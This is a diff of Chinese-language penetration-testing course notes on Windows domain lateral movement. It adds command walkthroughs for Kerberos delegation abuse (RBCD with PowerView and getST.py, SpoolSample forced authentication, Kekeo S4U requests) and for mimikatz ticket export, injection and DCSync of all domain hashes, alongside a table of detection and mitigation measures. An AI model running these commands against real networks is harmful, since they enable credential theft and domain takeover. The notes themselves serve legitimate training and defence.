@@ -3,8 +3,8 @@ title: XD安全渗透测试课程 Day67-68 学习笔记：域横向移动 SMB/WM
   内网扫描工具实战
 description: 整理 XD安全渗透测试课程第 67-68 天学习内容：Day67 覆盖域横向移动中 SMB 服务利用、WMI 服务利用、明文/哈希传递攻击及
   Procdump+Mimikatz 凭证导出；Day68 深入讲解 PTH（Pass the Hash）、PTK（Pass the Key）、PTT（Pass
-  the Ticket）三大凭证复用技术，含 Kerberos 协议原理、MS14-068 漏洞利用、黄金/白银票据生成、Kekeo 工具实战及本地票据导入导出，最后演示国产
-  Ladon 内网扫描器的存活主机发现与协议扫描功能。
+  the Ticket）三大凭证复用技术，含 Kerberos 协议原理、MS14-068 漏洞利用、黄金/白银票据生成、Kekeo 工具实战及本地票据导入导出，补充资源型约束委派、非约束委派、约束委派的详细利用命令（PowerView/GetST.py/kekeo/mimikatz）、SpoolSample
+  强制认证触发、票据导入导出实战细节，最后演示国产 Ladon 内网扫描器的存活主机发现与协议扫描功能。
 category: program-analysis
 tags:
 - XD安全
@@ -25,15 +25,19 @@ tags:
 - Ladon
 - Procdump
 - Impacket
+- 资源型约束委派
+- 非约束委派
+- 约束委派
+- SpoolSample
 - 学习笔记
 date: '2024-01-15'
 updated: '2026-11-15'
 ---
 ## 概述
 
-本页面整理自 XD安全渗透测试课程 Day67-68 的学习笔记，重点记录**域环境下的横向移动技术**与**Kerberos 认证体系下的凭证复用攻击**。Day67 侧重于利用 SMB 与 WMI 服务进行明文或 NTLM Hash 传递的实战操作；Day68 系统讲解 PTH/PTK/PTT 三大票据传递技术的原理差异、适用场景及工具化利用流程，并补充国产内网扫描工具 Ladon 的基础用法。内容贯穿“凭证获取 → 横向移动 → 权限维持”的内网渗透核心链路，适合红队实战与 OSCP 风格备考参考。
+本页面整理自 XD安全渗透测试课程 Day67-68 的学习笔记，重点记录**域环境下的横向移动技术**与**Kerberos 认证体系下的凭证复用攻击**。Day67 侧重于利用 SMB 与 WMI 服务进行明文或 NTLM Hash 传递的实战操作；Day68 系统讲解 PTH/PTK/PTT 三大票据传递技术的原理差异、适用场景及工具化利用流程，**重点补充资源型约束委派、非约束委派、约束委派的详细利用命令（PowerView/GetST.py/kekeo/mimikatz）、SpoolSample 强制认证触发、票据导入导出实战细节**，并补充国产内网扫描工具 Ladon 的基础用法。内容贯穿“凭证获取 → 横向移动 → 权限维持”的内网渗透核心链路，适合红队实战与 OSCP 风格备考参考。
 
-> **前置知识**：建议先阅读 [[xd-security-internal-network-penetration-notes-day65-66]]（域环境信息收集与 at/schtasks/impacket 横向移动）、[[xd-security-internal-network-penetration-notes-day69-70]]（域横向移动实战与 Cobalt Strike 隧道技术）、[[mimikatz-source-code-architecture-golden-ticket-audit]]（Mimikatz 黄金票据源码解析）、[[lm-ntlm-hash-generation-analysis]]（LM/NTLM Hash 生成算法深度解析）。
+> **前置知识**：建议先阅读 [[xd-security-internal-network-penetration-notes-day65-66]]（域环境信息收集与 at/schtasks/impacket 横向移动）、[[xd-security-internal-network-penetration-notes-day69-70]]（域横向移动实战与 Cobalt Strike 隧道技术）、[[mimikatz-source-code-architecture-golden-ticket-audit]]（Mimikatz 黄金票据源码解析）、[[lm-ntlm-hash-generation-analysis]]（LM/NTLM Hash 生成算法深度解析）、[[mimikatz-sekurlsa-pth-internals]]（Mimikatz sekurlsa::pth 内存补丁原理）。
 
 ---
 
@@ -124,9 +128,9 @@ wmiexec.py -hashes :<NTLM> administrator@192.168.3.32
 
 ---
 
-## Day68：PTH / PTK / PTT —— Kerberos 体系下的凭证复用攻击
+## Day68：Kerberos 凭证复用与委派攻击
 
-### 核心概念对比
+### 核心概念对比：PTH / PTK / PTT
 
 | 技术 | 利用凭证 | 认证协议 | 适用条件 | 典型工具 |
 |------|----------|----------|----------|----------|
@@ -153,6 +157,8 @@ mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:corp /ntlm:<N
 |------|----------|--------------|
 | **工作组** | 所有用户可连 | 仅 Administrator 可连 |
 | **域环境** | 所有域用户可连 | 仅域管/本地管理员可连 |
+
+> **底层原理**：[[mimikatz-sekurlsa-pth-internals]] 深度解析了 `sekurlsa::pth` 通过 LSASS 内存补丁替换 NTLM Hash 的实现细节。
 
 ### PTK 实战：传递 AES Key
 
@@ -231,7 +237,7 @@ Kekeo 专注于 Kerberos 票据操作，支持 **ASK TGT / ASK TGS / 票据转�
 # 1. 请求 TGT (需用户 Hash 或密码)
 kekeo.exe "tgt::ask /user:user /domain:corp /password:pass" exit
 
-# 2. 基于 TGT 请求特定服务 ST
+# 2. 基于 TGT 请求特定服务 ST (S4U2Self + S4U2Proxy)
 kekeo.exe "tgs::s4u /tgt:TGT_user@corp.kirbi /user:targetuser@corp /service:cifs/dc01.corp" exit
 
 # 3. 注入票据
@@ -249,6 +255,132 @@ mimikatz.exe "kerberos::ptt <ticket.kirbi>" exit
 ```
 
 **局限性**：票据默认生命周期 **10 小时** (可配置)，过期后需重新获取。
+
+---
+
+### Kerberos 委派攻击详解
+
+委派攻击的核心在于利用 Kerberos 协议的 **S4U2Self** 与 **S4U2Proxy** 扩展，在拥有特定权限（如控制机器账号、服务账号）的前提下，伪造任意用户的服务票据 (ST) 访问目标资源。
+
+#### 基于资源的约束委派 (Resource-Based Constrained Delegation - RBCD)
+
+**原理**：目标机器 (Resource) 设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，指定哪些账号 (如攻击者控制的机器账号) 可以向其委派。攻击者利用 S4U2Self 为任意用户获取针对自身的 ST，再利用 S4U2Proxy 向目标机器请求该用户的 ST。
+
+**利用条件**：
+- 普通域用户默认可添加机器账号 (`MachineAccountQuota` 默认 10)
+- 拥有目标机器的写权限 (如拥有该机器账号的所有权、GenericAll、GenericWrite、WriteProperty 等)
+
+**PowerView 利用流程**：
+
+```powershell
+# 1. 添加攻击者控制的机器账号 (需域用户权限)
+# 假设攻击者已添加机器账号 EVILPC$ (密码已知)
+
+# 2. 获取目标机器 SID
+$target = Get-DomainComputer -Identity "TARGET$"
+$target_sid = $target.ObjectSID
+
+# 3. 构造 Security Descriptor，授予 EVILPC$ 允许委派权限
+$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-EVILPC_RID)"
+$sd_bytes = New-Object byte[] ($sd.BinaryLength)
+$sd.GetBinaryForm($sd_bytes, 0)
+
+# 4. 写入目标机器 msDS-AllowedToActOnBehalfOfOtherIdentity
+Set-DomainObject -Identity "TARGET$" -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$sd_bytes} -Verbose
+
+# 5. 验证
+Get-DomainComputer -Identity "TARGET$" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+**GetST.py (Impacket) 利用流程**：
+
+```bash
+# 1. 利用 EVILPC$ 账号请求 Administrator 针对 TARGET$ cifs 服务的 ST
+getST.py -dc-ip <DC_IP> <DOMAIN>/EVILPC$:<PASSWORD> -spn cifs/TARGET.<DOMAIN> -impersonate Administrator
+
+# 2. 导出票据环境变量
+export KRB5CCNAME=Administrator.ccache
+
+# 3. 利用票据访问 (支持 Kerberos 认证的工具)
+smbexec.py -k -no-pass TARGET.<DOMAIN>
+wmiexec.py -k -no-pass TARGET.<DOMAIN>
+```
+
+#### 非约束委派 (Unconstrained Delegation)
+
+**原理**：配置了非约束委派的服务账号 (或机器账号) 在用户使用 Kerberos 认证访问该服务时，会将用户的 **TGT (Ticket Granting Ticket)** 发送给服务端。服务端可利用此 TGT 代表用户访问域内任意服务。
+
+**利用前提**：
+- 目标服务账号/机器账号开启 "Trust this computer for delegation to any service (Kerberos only)"
+- 能强制高权限用户 (如域管、域控机器账号) 向该服务发起认证
+
+**SpoolSample 强制认证触发**：
+
+利用 MS-RPRN 协议 (Print Spooler) 强制目标主机向指定主机发起 Kerberos/NTLM 认证。
+
+```bash
+# SpoolSample.exe <Listener> <Target>
+# 让域控 (DC) 向开启非约束委派的机器 (TARGET) 发起认证
+SpoolSample.exe DC01 TARGET
+# 或让 TARGET 向 DC 发起认证 (需 TARGET 运行 Print Spooler)
+SpoolSample.exe TARGET DC01
+```
+
+**票据导出导入实战** (在开启非约束委派的机器上执行)：
+
+```bash
+# 1. 导出内存中缓存的所有票据 (含域管 TGT)
+mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
+
+# 2. 筛选高价值票据 (如 [0;1f9fc7]-2-0-60a10000-DC01$@krbtgt-DOMAIN.COM.kirbi)
+# 3. 注入票据
+mimikatz.exe "kerberos::ptt [0;1f9fc7]-2-0-60a10000-DC01$@krbtgt-DOMAIN.COM.kirbi" exit
+
+# 4. 验证域控权限
+dir \\DC01\C$
+# 5. 可进一步 DCSync 导出所有 Hash
+mimikatz.exe "lsadump::dcsync /domain:DOMAIN.COM /all /csv" exit
+```
+
+**发现非约束委派主机/用户** (PowerView)：
+
+```powershell
+Get-NetUser -Unconstrained -Domain <DOMAIN>
+Get-NetComputer -Unconstrained -Domain <DOMAIN>
+```
+
+#### 约束委派 (Constrained Delegation)
+
+**原理**：服务账号配置了 "Trust this computer for delegation to specified services only" (Kerberos Only)。服务可利用 S4U2Proxy 协议，凭借用户的 ST (通过 S4U2Self 获取) 向指定的目标服务请求 ST。
+
+**利用前提**：
+- 拥有配置了约束委派的服务账号的明文密码或 NTLM/AES Hash
+- 目标服务 SPN 在该服务账号的 `msDS-AllowedToDelegateTo` 列表中
+
+**Kekeo 实战流程** (利用服务账号 `test` 委派至 `cifs/DC01`)：
+
+```bash
+# 1. 请求服务账号 test 的 TGT
+kekeo.exe "tgt::ask /user:test /domain:DOMAIN.COM /password:Passw0rd" exit
+# 生成 TGT_test@DOMAIN.COM_krbtgt~DOMAIN.COM@DOMAIN.COM.kirbi
+
+# 2. 利用 S4U2Self + S4U2Proxy 请求 Administrator 针对 DC01 cifs 服务的 ST
+kekeo.exe "tgs::s4u /tgt:TGT_test@DOMAIN.COM_krbtgt~DOMAIN.COM@DOMAIN.COM.kirbi /user:Administrator@DOMAIN.COM /service:cifs/DC01.DOMAIN.COM" exit
+# 生成 TGS_Administrator@DOMAIN.COM@DOMAIN.COM_cifs~DC01.DOMAIN.COM@DOMAIN.COM.kirbi
+
+# 3. Mimikatz 注入 ST
+mimikatz.exe "kerberos::ptt TGS_Administrator@DOMAIN.COM@DOMAIN.COM_cifs~DC01.DOMAIN.COM@DOMAIN.COM.kirbi" exit
+
+# 4. 访问 DC01 CIFS
+dir \\DC01.DOMAIN.COM\C$
+```
+
+**发现约束委派主机/用户** (PowerView)：
+
+```powershell
+Get-DomainUser -TrustedToAuth -Domain <DOMAIN>
+Get-DomainComputer -TrustedToAuth -Domain <DOMAIN>
+```
 
 ---
 
@@ -288,34 +420,37 @@ Ladon.exe -f portscan.txt WMI -u admin -p "pass" -c "whoami" -o wmi_exec.txt
 | 攻击阶段 | 关键技术 | 检测/缓解措施 |
 |----------|----------|---------------|
 | **凭证获取** | Mimikatz、Procdump、LSASS Dump | 开启 Credential Guard、LSA 保护 (RunAsPPL)、EDR 监控 `lsass.exe` 访问 |
-| **SMB 横向** | PsExec、smbexec、Impacket | 禁用 SMBv1、限制 445 端口、监控 Event ID 4624 Type 3 / Sysmon 17/18 命名管道 |
+| **SMB 横向** | PsExec、smbexec、Impacket | 禁用 SMBv1、限制 445 端口、监控 Event ID 4624 Type 3 / Sysmon 17/18 命名管道 ([[named-pipe-smb-detection-sysmon]]) |
 | **WMI 横向** | wmic、wmiexec、DCOM | 监控 `WmiPrvSE.exe` 启动异常子进程、限制 135/RPC 动态端口、启用 WMI 审核 |
-| **PTH/PTK** | Mimikatz `sekurlsa::pth` | 强制 Kerberos AES、禁用 NTLM (组策略)、部署 ATA/Defender for Identity |
+| **PTH/PTK** | Mimikatz `sekurlsa::pth` ([[mimikatz-sekurlsa-pth-internals]]) | 强制 Kerberos AES、禁用 NTLM (组策略)、部署 ATA/Defender for Identity |
 | **PTT (黄金/白银/MS14-068)** | 票据伪造与注入 | 定期轮换 `krbtgt` 密钥 (双次轮换)、打补丁 KB3011780、监控异常 TGT/ST 申请 (Event ID 4768/4769) |
-| **内网扫描** | Ladon、fscan、Nmap | 网络微隔离、蜜罐部署 (参考 [[xd-security-blue-team-defense]] 中 HFish 实战)、流量基线异常告警 |
+| **委派攻击 (RBCD/Unconstrained/Constrained)** | `msDS-AllowedToActOnBehalfOfOtherIdentity` 篡改、SpoolSample 强制认证、服务账号 Hash 窃取 | 严格控制 `MachineAccountQuota` (设为 0)、监控敏感属性变更 (Event ID 5136)、禁用 Print Spooler 服务、最小化委派配置、保护服务账号凭证 (LAPS/托管服务账号 gMSA) |
+| **内网扫描** | Ladon、fscan、Nmap | 网络微隔离、蜜罐部署 ([[xd-security-blue-team-defense]] 中 HFish 实战)、流量基线异常告警 |
 
 ---
 
 ## 交叉引用导航
 
 - **前序笔记**：[[xd-security-internal-network-penetration-notes-day65-66]]（域环境信息收集与 at/schtasks/impacket 横向移动）、[[xd-security-internal-network-penetration-notes-day69-70]]（域横向实战与 Cobalt Strike 隧道）、[[xd-security-internal-network-penetration-notes-day71-72]]（ICMP/DNS 隧道与会话移交）  
-- **工具深度解析**：[[mimikatz-source-code-architecture-golden-ticket-audit]]、[[lm-ntlm-hash-generation-analysis]]、[[named-pipe-smb-detection-sysmon]]、[[smb-named-pipe-c2-communication]]、[[cobalt-strike-external-c2-smb-beacon]]  
+- **工具深度解析**：[[mimikatz-source-code-architecture-golden-ticket-audit]]、[[lm-ntlm-hash-generation-analysis]]、[[named-pipe-smb-detection-sysmon]]、[[smb-named-pipe-c2-communication]]、[[cobalt-strike-external-c2-smb-beacon]]、[[mimikatz-sekurlsa-pth-internals]]  
 - **红队基础设施**：[[internal-network-pivoting-techniques]]（Venom/Frp/SSH/SMB Beacon 代理对比）、[[c2-redirectors-malleable-c2-profiles]]（流量混淆）  
 - **蓝队防御体系**：[[xd-security-blue-team-defense]]（ATT&CK 映射、蜜罐、NIDS/HIDS、检测规则编写）  
-- **课程全景**：[[xd-security-pentest-course-curriculum]]（88 天大纲与资源下载）
+- **课程全景**：[[xd-security-pentest-course-curriculum]]（88 天大纲与资源下载）  
+- **提权关联**：[[xd-security-privilege-escalation-notes-day58-64]]（Windows/Linux 提权、Dirty COW、令牌窃取）
 
 ---
 
 ## 结语
 
-Day67-68 笔记串联了**从凭证获取到横向移动、再到票据级持久化**的完整攻击链。实战中建议：
-1. **优先评估补丁级别** 决定 PTH/PTK/PTT 选择；  
+Day67-68 笔记串联了**从凭证获取到横向移动、再到票据级持久化与委派攻击**的完整攻击链。实战中建议：
+1. **优先评估补丁级别与委派配置** 决定 PTH/PTK/PTT 及委派利用选择；  
 2. **组合使用 SMB 与 WMI** 规避单一协议监控；  
-3. **票据攻击作为权限维持首选**，但需严格控制 `krbtgt` 轮换周期；  
-4. **自动化扫描 (Ladon/fscan) + 手工验证** 相结合，提升内网资产发现效率。
+3. **委派攻击 (RBCD/Unconstrained/Constrained) 是域内权限横向与提权的核心手段**，需熟练掌握 PowerView、GetST.py、Kekeo、Mimikatz 的联动操作；  
+4. **票据攻击作为权限维持首选**，但需严格控制 `krbtgt` 轮换周期；  
+5. **自动化扫描 (Ladon/fscan) + 手工验证** 相结合，提升内网资产发现效率。
 
 后续 Day69-72 将进一步展开 **Cobalt Strike 团队协作、隧道技术深度、会话移交与应急响应溯源**，敬请关注。
 
 ## 来源
 
-- [0x00实验室-202108-202304_107](../sources/0x00实验室-202108-202304_107.md)
+- [226安全团队-201805-202103_05](../sources/226安全团队-201805-202103_05.md)
